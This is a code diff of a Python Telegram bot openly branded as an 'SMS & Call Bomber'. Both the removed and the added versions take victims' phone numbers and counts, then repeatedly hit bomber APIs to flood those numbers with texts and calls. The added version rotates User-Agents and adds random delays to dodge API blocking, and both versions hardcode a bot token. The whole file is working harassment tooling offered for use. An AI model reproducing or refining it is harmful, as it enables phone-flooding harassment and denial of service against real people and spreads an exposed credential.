@@ -1,298 +1,169 @@
-from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    MessageHandler,
-    CallbackQueryHandler,
-    ConversationHandler,
-    ContextTypes,
-    filters,
-)
-import aiohttp
-import asyncio
-import logging
+import telebot
+import requests
+import time
 import random
+import sqlite3
 from datetime import datetime
-import json
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-# Bot Configuration
-BOT_TOKEN = "7619796671:AAFLnz5d1SSh1jhJakaoR7Ny9dXNWMT_0qA"
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
+# Bot token
+TOKEN = "7619796671:AAFLnz5d1SSh1jhJakaoR7Ny9dXNWMT_0qA"
+ADMIN_ID = None  # Admin ID blank rakha holo, tui pore set korte parbi
 
-# States for ConversationHandler
-ASK_NUMBER, ASK_SMS_LIMIT, ASK_CALL_LIMIT, CONFIRM, REPEAT = range(5)
-user_data = {}
+# Initialize bot
+bot = telebot.TeleBot(TOKEN)
 
-# Gorgeous Dark Theme Messages
-BANNER = """
-🌑═══════ SM - DARK STORM ═══════🌑
-       💣 SMS & CALL BOMBER 💣
-🌑═══════ UNLEASH THE CHAOS ═══════🌑
-"""
-WELCOME_MESSAGE = (
-    f"{BANNER}\n"
-    "🌙 *Welcome to SM - The Dark Storm Bomber!*\n"
-    "Ignite chaos with elegance. 💣📞\n"
-    "Click *Launch Attack* to begin.\n"
-    "⚠️ *Use responsibly.*"
-)
-REPEAT_MESSAGE = (
-    "🌩️ *Storm another target?*\n"
-    "Click *Launch Again* to continue the chaos."
-)
+# Initialize SQLite database
+conn = sqlite3.connect("users.db", check_same_thread=False)
+cursor = conn.cursor()
+cursor.execute('''CREATE TABLE IF NOT EXISTS users (
+                    user_id INTEGER PRIMARY KEY,
+                    username TEXT,
+                    first_name TEXT,
+                    last_name TEXT,
+                    last_command_time TEXT
+                )''')
+conn.commit()
 
-# API Endpoints (Multiple for Reliability)
-SMS_API_ENDPOINTS = [
-    "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={number}",
-    "https://sms-bomber-api1.example.com/send?phone={number}",
-    "https://sms-bomber-api2.example.com/send?phone={number}",
-]
-CALL_API_ENDPOINTS = [
-    "https://call-bomber-api1.example.com/call?phone={number}",
-    "https://call-bomber-api2.example.com/call?phone={number}",
+# User-Agent list for rotation
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
 ]
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Start the bot with a dark-themed interface."""
-    reply_keyboard = [["🔮 Launch Attack"]]
-    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
-    await update.message.reply_text(
-        WELCOME_MESSAGE,
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-    return ASK_NUMBER
+# Keyboard markup
+def create_menu():
+    markup = ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add(KeyboardButton("/start"))
+    markup.add(KeyboardButton("/bomb"))
+    if ADMIN_ID:
+        markup.add(KeyboardButton("/i5d"))
+    return markup
 
-async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Request target number."""
-    if update.message.text != "🔮 Launch Attack" and update.message.text != "🔮 Launch Again":
-        await update.message.reply_text("🌙 Select *Launch Attack* to proceed!", parse_mode="Markdown")
-        return ASK_NUMBER
+# Save user info to database
+def save_user_info(message):
+    user_id = message.from_user.id
+    username = message.from_user.username or "N/A"
+    first_name = message.from_user.first_name or "N/A"
+    last_name = message.from_user.last_name or "N/A"
+    last_command_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    await update.message.reply_text(
-        "📲 Enter target number (Format: 01XXXXXXXXX or 8801XXXXXXXXX):",
-        parse_mode="Markdown"
-    )
-    return ASK_SMS_LIMIT
+    cursor.execute('''INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, last_command_time)
+                     VALUES (?, ?, ?, ?, ?)''', (user_id, username, first_name, last_name, last_command_time))
+    conn.commit()
 
-async def ask_sms_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Request SMS blast count."""
-    number = update.message.text.strip()
+# Start command
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    save_user_info(message)
+    bot.reply_to(message, "🍁✨ Welcome to SM Bomber Bot ✨🍁\n"
+                          "Use /bomb to start bombing.\n"
+                          "Designed by: SM", reply_markup=create_menu())
 
-    if number.startswith("01") and len(number) == 11:
-        number = "880" + number
-    elif number.startswith("8801") and len(number) == 13:
-        pass
-    else:
-        await update.message.reply_text("❌ Invalid number! Use: 01XXXXXXXXX or 8801XXXXXXXXX", parse_mode="Markdown")
-        return ASK_SMS_LIMIT
+# Bomb command
+@bot.message_handler(commands=['bomb'])
+def bomb_command(message):
+    save_user_info(message)
+    bot.reply_to(message, "Enter phone numbers (comma-separated, e.g., 01712345678,01987654321):")
+    bot.register_next_step_handler(message, get_phone_numbers)
 
-    user_data[update.effective_chat.id] = {"number": number}
-    await update.message.reply_text(
-        "💥 How many SMS to unleash? (Max 100)",
-        parse_mode="Markdown"
-    )
-    return ASK_CALL_LIMIT
+def get_phone_numbers(message):
+    save_user_info(message)
+    phone_numbers = [num.strip() for num in message.text.split(",")]
+    if not all(num.startswith("01") and num.isdigit() and len(num) == 11 for num in phone_numbers):
+        bot.reply_to(message, "Invalid phone numbers! Must be 11 digits starting with 01.")
+        return
+    bot.reply_to(message, "Enter SMS count (0-100):")
+    bot.register_next_step_handler(message, lambda m: get_sms_count(m, phone_numbers))
 
-async def ask_call_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Request call blast count."""
+def get_sms_count(message, phone_numbers):
+    save_user_info(message)
     try:
-        sms_limit = int(update.message.text.strip())
-        if sms_limit < 1 or sms_limit > 100:
-            await update.message.reply_text("⚠️ Enter 1-100 SMS!", parse_mode="Markdown")
-            return ASK_CALL_LIMIT
+        sms_count = int(message.text)
+        if not (0 <= sms_count <= 100):
+            raise ValueError
     except ValueError:
-        await update.message.reply_text("❌ Enter a valid SMS count!", parse_mode="Markdown")
-        return ASK_CALL_LIMIT
+        bot.reply_to(message, "SMS count must be between 0 and 100!")
+        return
+    bot.reply_to(message, "Enter call count (0-100):")
+    bot.register_next_step_handler(message, lambda m: get_call_count(m, phone_numbers, sms_count))
 
-    user_data[update.effective_chat.id]["sms_limit"] = sms_limit
-    await update.message.reply_text(
-        "📞 How many calls to storm? (Max 50)",
-        parse_mode="Markdown"
-    )
-    return CONFIRM
-
-async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Confirm the attack details."""
+def get_call_count(message, phone_numbers, sms_count):
+    save_user_info(message)
     try:
-        call_limit = int(update.message.text.strip())
-        if call_limit < 1 or call_limit > 50:
-            await update.message.reply_text("⚠️ Enter 1-50 calls!", parse_mode="Markdown")
-            return CONFIRM
+        call_count = int(message.text)
+        if not (0 <= call_count <= 100):
+            raise ValueError
+        if sms_count == 0 and call_count == 0:
+            bot.reply_to(message, "Both SMS and Call counts cannot be 0!")
+            return
     except ValueError:
-        await update.message.reply_text("❌ Enter a valid call count!", parse_mode="Markdown")
-        return CONFIRM
-
-    chat_id = update.effective_chat.id
-    number = user_data.get(chat_id, {}).get("number")
-    sms_limit = user_data.get(chat_id, {}).get("sms_limit")
-
-    if not number or not sms_limit:
-        await update.message.reply_text("😵‍💫 Restart with /start", parse_mode="Markdown")
-        return ConversationHandler.END
-
-    user_data[chat_id]["call_limit"] = call_limit
-
-    confirm_keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ Ignite Storm", callback_data=f"confirm_{chat_id}")],
-        [InlineKeyboardButton("❌ Abort", callback_data=f"cancel_{chat_id}")]
-    ])
-    await update.message.reply_text(
-        f"🌀 *Target*: {number}\n"
-        f"💥 *SMS*: {sms_limit}\n"
-        f"📞 *Calls*: {call_limit}\n"
-        f"Ready to dominate?",
-        parse_mode="Markdown",
-        reply_markup=confirm_keyboard
-    )
-    return REPEAT
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle confirmation/cancellation and execute bombing."""
-    query = update.callback_query
-    await query.answer()
-
-    chat_id = query.message.chat_id
-    data = query.data.split("_")
-    action = data[0]
-
-    if action not in ["confirm", "cancel", "repeat"] or int(data[1]) != chat_id:
-        await query.message.reply_text("❌ Invalid action!", parse_mode="Markdown")
+        bot.reply_to(message, "Call count must be between 0 and 100!")
         return
+    bot.reply_to(message, "Enter delay (seconds, e.g., 2):")
+    bot.register_next_step_handler(message, lambda m: get_delay(m, phone_numbers, sms_count, call_count))
 
-    if action == "cancel":
-        await query.message.reply_text("🛑 Storm aborted.", parse_mode="Markdown")
-        user_data.pop(chat_id, None)
-        return
-
-    if action == "repeat":
-        reply_keyboard = [["🔮 Launch Again"]]
-        markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
-        await query.message.reply_text(
-            REPEAT_MESSAGE,
-            parse_mode="Markdown",
-            reply_markup=markup
-        )
-        return
-
-    number = user_data.get(chat_id, {}).get("number")
-    sms_limit = user_data.get(chat_id, {}).get("sms_limit")
-    call_limit = user_data.get(chat_id, {}).get("call_limit")
-
-    await query.message.reply_text(
-        f"🌩️ *Storm Initiated!*\n"
-        f"Targeting {number} with {sms_limit} SMS and {call_limit} calls...",
-        parse_mode="Markdown"
-    )
-
-    # SMS Bombing
-    sms_success, sms_fail = 0, 0
-    async with aiohttp.ClientSession() as session:
-        for _ in range(sms_limit):
-            for api in SMS_API_ENDPOINTS:
-                try:
-                    async with session.get(api.format(number=number), timeout=10) as resp:
-                        if resp.status == 200:
-                            sms_success += 1
-                            await query.message.reply_text(
-                                f"💥 SMS Sent! Total Success: {sms_success}",
-                                parse_mode="Markdown"
-                            )
-                        else:
-                            sms_fail += 1
-                        await asyncio.sleep(2)  # 2-second delay
-                except Exception as e:
-                    logger.error(f"SMS API error: {e}")
-                    sms_fail += 1
-
-    # Call Bombing
-    call_success, call_fail = 0, 0
-    async with aiohttp.ClientSession() as session:
-        for _ in range(call_limit):
-            for api in CALL_API_ENDPOINTS:
-                try:
-                    async with session.get(api.format(number=number), timeout=10) as resp:
-                        if resp.status == 200:
-                            call_success += 1
-                            await query.message.reply_text(
-                                f"📞 Call Sent! Total Success: {call_success}",
-                                parse_mode="Markdown"
-                            )
-                        else:
-                            call_fail += 1
-                        await asyncio.sleep(2)  # 2-second delay
-                except Exception as e:
-                    logger.error(f"Call API error: {e}")
-                    call_fail += 1
-
-    # Save attack log
-    log_entry = {
-        "timestamp": datetime.now().isoformat(),
-        "number": number,
-        "sms_limit": sms_limit,
-        "sms_success": sms_success,
-        "sms_failed": sms_fail,
-        "call_limit": call_limit,
-        "call_success": call_success,
-        "call_failed": call_fail
-    }
+def get_delay(message, phone_numbers, sms_count, call_count):
+    save_user_info(message)
     try:
-        with open("attack_log.json", "a") as f:
-            json.dump(log_entry, f)
-            f.write("\n")
-    except Exception as e:
-        logger.error(f"Log write error: {e}")
+        delay = float(message.text)
+        if delay < 0:
+            raise ValueError
+    except ValueError:
+        bot.reply_to(message, "Delay must be non-negative!")
+        return
+    start_bombing(message, phone_numbers, sms_count, call_count, delay)
 
-    # Show results and offer to repeat
-    repeat_keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔄 Launch Again", callback_data=f"repeat_{chat_id}")]
-    ])
-    await query.message.reply_text(
-        f"🌑 *Storm Concluded!*\n"
-        f"💥 SMS - Success: {sms_success}, Failed: {sms_fail}\n"
-        f"📞 Calls - Success: {call_success}, Failed: {call_fail}\n"
-        f"Continue the chaos?",
-        parse_mode="Markdown",
-        reply_markup=repeat_keyboard
-    )
+# Bombing logic
+def start_bombing(message, phone_numbers, sms_count, call_count, delay):
+    total_requests = (sms_count + call_count) * len(phone_numbers)
+    request_counter = 0
+    bot.reply_to(message, "Starting bombing...")
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Cancel the operation."""
-    await update.message.reply_text("🛑 Operation halted.", parse_mode="Markdown")
-    user_data.pop(update.effective_chat.id, None)
-    return ConversationHandler.END
+    for phone in phone_numbers:
+        requests_list = [{"type": "sms", "phone": phone} for _ in range(sms_count)] + \
+                       [{"type": "call", "phone": phone} for _ in range(call_count)]
+        random.shuffle(requests_list)
 
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle errors gracefully."""
-    logger.error(f"Update {update} caused error {context.error}")
-    if update and hasattr(update, 'message') and update.message:
-        await update.message.reply_text(
-            "😵‍💫 Error struck! Restart with /start",
-            parse_mode="Markdown"
-        )
+        bot.reply_to(message, f"Bombing number: {phone}")
+        for req in requests_list:
+            request_counter += 1
+            headers = {"User-Agent": random.choice(USER_AGENTS)}
+            url = f"https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={req['phone']}&type={req['type']}"
+            try:
+                response = requests.get(url, headers=headers, timeout=10)
+                status = f"Success (HTTP {response.status_code})" if response.status_code == 200 else f"Unsuccessful (HTTP {response.status_code})"
+                success = response.status_code == 200
+            except requests.RequestException as e:
+                status = f"Unsuccessful: {str(e)}"
+                success = False
+            bot.reply_to(message, f"[{request_counter}/{total_requests}] Trial API ({req['type'].upper()} to {phone}): {status}")
+            time.sleep(delay + random.uniform(0.1, 0.5))  # Random delay to avoid API block
 
-def main() -> None:
-    """Run the bot."""
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    bot.reply_to(message, "Bombing completed successfully!", reply_markup=create_menu())
 
-    conv_handler = ConversationHandler(
-        entry_points=[CommandHandler("start", start)],
-        states={
-            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_number)],
-            ASK_SMS_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_sms_limit)],
-            ASK_CALL_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_call_limit)],
-            CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_attack)],
-            REPEAT: [CallbackQueryHandler(button_callback)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
+# Admin command to show user info
+@bot.message_handler(commands=['i5d'])
+def show_users(message):
+    if not ADMIN_ID or message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "This command is for admin only!")
+        return
+    save_user_info(message)
+    cursor.execute("SELECT * FROM users")
+    users = cursor.fetchall()
+    if not users:
+        bot.reply_to(message, "No users found!")
+        return
+    response = "User Info:\n"
+    for user in users:
+        response += (f"User ID: {user[0]}\n"
+                     f"Username: {user[1]}\n"
+                     f"First Name: {user[2]}\n"
+                     f"Last Name: {user[3]}\n"
+                     f"Last Command: {user[4]}\n"
+                     f"{'-'*20}\n")
+    bot.reply_to(message, response, reply_markup=create_menu())
 
-    app.add_handler(conv_handler)
-    app.add_handler(CallbackQueryHandler(button_callback))
-    app.add_error_handler(error_handler)
-
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+# Start polling
+bot.polling()
